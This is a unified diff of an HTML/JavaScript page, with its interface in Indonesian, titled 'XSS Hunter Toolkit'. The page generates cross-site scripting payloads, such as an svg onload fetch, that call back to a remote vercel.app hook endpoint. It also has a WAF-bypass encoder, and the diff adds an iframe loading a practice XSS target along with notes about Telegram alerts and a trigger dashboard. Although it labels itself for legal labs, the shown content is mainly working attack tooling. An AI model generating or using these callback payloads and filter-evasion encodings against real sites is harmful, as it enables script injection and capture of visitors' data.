@@ -2,10 +2,14 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Hunter Toolkit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>XSS Hunter Toolkit | Generator + Live Target</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
@@ -13,7 +17,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 1100px;
+            max-width: 1300px;
             margin: 0 auto;
         }
         h1 {
@@ -39,6 +43,8 @@
             margin-bottom: 15px;
             color: #00ff00;
             font-size: 1.4rem;
+            border-left: 3px solid #00ff00;
+            padding-left: 12px;
         }
         label {
             display: block;
@@ -63,6 +69,7 @@
             border-radius: 8px;
             font-weight: bold;
             cursor: pointer;
+            color: #0a0a0a;
         }
         .output {
             background: #0a0a0a;
@@ -89,34 +96,46 @@
             flex: 1;
             min-width: 250px;
         }
+        iframe {
+            width: 100%;
+            height: 500px;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            background: white;
+        }
+        .note {
+            font-size: 12px;
+            color: #ffaa00;
+            margin-top: 8px;
+        }
+        hr {
+            border-color: #333;
+            margin: 15px 0;
+        }
         @media (max-width: 700px) {
             .flex-row { flex-direction: column; }
-        }
-        .badge {
-            display: inline-block;
-            background: #00ff0022;
-            padding: 2px 8px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-left: 8px;
+            iframe { height: 400px; }
         }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>🕵️ XSS Hunter Toolkit</h1>
-    <div class="sub">Payload Generator + WAF Bypass + Real-time Dashboard</div>
+    <div class="sub">Payload Generator + WAF Bypass + Live Target (Lab Legal)</div>
 
+    <!-- KONFIGURASI HUNTER -->
     <div class="card">
         <h2>⚙️ Konfigurasi Hunter</h2>
         <label>Endpoint Vercel (API Hook)</label>
         <input type="text" id="endpoint" value="https://xss-hunter-by-foxxy.vercel.app/api/hook">
         <label>Marker (identifikasi lokasi injeksi)</label>
-        <input type="text" id="marker" value="test">
+        <input type="text" id="marker" value="google-level1">
+        <div class="note">💡 Ganti marker sesuai target (contoh: search-form, comment, level1)</div>
     </div>
 
+    <!-- GENERATOR PAYLOAD -->
     <div class="card">
-        <h2>📦 Generator Payload Hunter <span class="badge">Opsi 1</span></h2>
+        <h2>📦 Generator Payload Hunter</h2>
         <div class="flex-row">
             <div class="flex-col">
                 <label>Tipe Payload</label>
@@ -135,18 +154,19 @@
                 </select>
             </div>
             <div class="flex-col">
-                <label>Hasil Payload</label>
+                <label>Hasil Payload (copy & inject ke target)</label>
                 <div id="generatedPayload" class="output">Pilih tipe payload...</div>
                 <button id="copyPayloadBtn" class="copy-btn">📋 Copy Payload</button>
             </div>
         </div>
     </div>
 
+    <!-- WAF BYPASS ENCODER -->
     <div class="card">
-        <h2>🔐 WAF Bypass Encoder <span class="badge">Opsi 2</span></h2>
+        <h2>🔐 WAF Bypass Encoder</h2>
         <div class="flex-row">
             <div class="flex-col">
-                <label>Payload mentah</label>
+                <label>Payload mentah (dari generator atau custom)</label>
                 <textarea id="rawPayload" rows="3" placeholder="Tempel payload di sini..."></textarea>
                 <label>Metode Encoding</label>
                 <select id="encodeMethod">
@@ -161,21 +181,36 @@
                 <button id="encodeBtn">🔧 Encode</button>
             </div>
             <div class="flex-col">
-                <label>Hasil Encoded</label>
+                <label>Hasil Encoded (copy untuk bypass WAF)</label>
                 <div id="encodedOutput" class="output">-</div>
                 <button id="copyEncodedBtn" class="copy-btn">📋 Copy Encoded</button>
             </div>
         </div>
     </div>
 
+    <!-- LIVE TARGET IFRAME (untuk injeksi manual) -->
     <div class="card">
-        <h2>📊 Dashboard Trigger <span class="badge">Opsi 4</span></h2>
+        <h2>🎯 Live Target (Lab Legal)</h2>
+        <label>URL Target (hanya lab yang mengizinkan XSS, misal Google XSS Game)</label>
+        <div class="flex-row" style="gap: 10px;">
+            <input type="text" id="targetUrl" value="https://xss-game.appspot.com/level1/frame" style="flex:4">
+            <button id="loadTargetBtn" style="flex:1">Load Target</button>
+        </div>
+        <div class="note">💡 Cara menggunakan: generate payload → copy → klik di dalam iframe → tempel payload ke form/parameter URL → submit. Perhatikan notifikasi Telegram dan dashboard hunter.</div>
+        <iframe id="targetFrame" src="https://xss-game.appspot.com/level1/frame" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-same-origin allow-scripts allow-popups"></iframe>
+    </div>
+
+    <!-- DASHBOARD LINK -->
+    <div class="card">
+        <h2>📊 Dashboard Trigger</h2>
         <p>Lihat semua XSS trigger yang tercatat di database.</p>
         <button id="goDashboardBtn">🚀 Buka Dashboard</button>
+        <div class="note">Pastikan Redis database sudah di-set di Vercel.</div>
     </div>
 </div>
 
 <script>
+    // ==================== ELEMEN ====================
     const endpointInput = document.getElementById('endpoint');
     const markerInput = document.getElementById('marker');
     const payloadType = document.getElementById('payloadType');
@@ -184,7 +219,11 @@
     const rawPayloadText = document.getElementById('rawPayload');
     const encodeMethod = document.getElementById('encodeMethod');
     const encodedOutputDiv = document.getElementById('encodedOutput');
+    const targetUrlInput = document.getElementById('targetUrl');
+    const targetFrame = document.getElementById('targetFrame');
+    const loadTargetBtn = document.getElementById('loadTargetBtn');
 
+    // ==================== GENERATE PAYLOAD ====================
     function generatePayload() {
         let hookUrl = endpointInput.value.trim();
         let marker = markerInput.value.trim();
@@ -216,14 +255,19 @@
             case 'svg':
                 payload = `<svg/onload="fetch('${base}')">`;
                 break;
+            default: payload = '';
         }
         generatedPayloadDiv.innerText = payload;
-        rawPayloadText.value = payload;
+        rawPayloadText.value = payload; // otomatis masuk ke encoder
     }
 
+    // ==================== ENCODE PAYLOAD ====================
     function encodePayload() {
         let raw = rawPayloadText.value;
-        if (!raw) { encodedOutputDiv.innerText = '❌ Kosong'; return; }
+        if (!raw) {
+            encodedOutputDiv.innerText = '❌ Tidak ada payload untuk di-encode';
+            return;
+        }
         const method = encodeMethod.value;
         let encoded = raw;
         switch(method) {
@@ -252,21 +296,35 @@
         encodedOutputDiv.innerText = encoded;
     }
 
+    // ==================== EVENT LISTENERS ====================
     payloadType.addEventListener('change', generatePayload);
     dataOption.addEventListener('change', generatePayload);
     markerInput.addEventListener('input', generatePayload);
     endpointInput.addEventListener('input', generatePayload);
-    document.getElementById('copyPayloadBtn').onclick = () => {
-        const t = generatedPayloadDiv.innerText;
-        if (t && !t.includes('Pilih')) { navigator.clipboard.writeText(t); alert('Copied!'); }
-        else alert('Belum ada payload');
-    };
-    document.getElementById('encodeBtn').onclick = encodePayload;
-    document.getElementById('copyEncodedBtn').onclick = () => {
-        const t = encodedOutputDiv.innerText;
-        if (t && t !== '-') { navigator.clipboard.writeText(t); alert('Copied!'); }
-    };
-    document.getElementById('goDashboardBtn').onclick = () => location.href = '/dashboard.html';
+    document.getElementById('copyPayloadBtn').addEventListener('click', () => {
+        const txt = generatedPayloadDiv.innerText;
+        if (txt && !txt.includes('Pilih tipe payload')) {
+            navigator.clipboard.writeText(txt);
+            alert('Payload disalin!');
+        } else alert('Belum ada payload.');
+    });
+    document.getElementById('encodeBtn').addEventListener('click', encodePayload);
+    document.getElementById('copyEncodedBtn').addEventListener('click', () => {
+        const txt = encodedOutputDiv.innerText;
+        if (txt && txt !== '-') {
+            navigator.clipboard.writeText(txt);
+            alert('Encoded payload disalin!');
+        }
+    });
+    document.getElementById('goDashboardBtn').addEventListener('click', () => {
+        window.location.href = '/dashboard.html';
+    });
+    loadTargetBtn.addEventListener('click', () => {
+        let url = targetUrlInput.value.trim();
+        if (url) targetFrame.src = url;
+        else alert('Masukkan URL target!');
+    });
+    // Generate awal
     generatePayload();
 </script>
 </body>
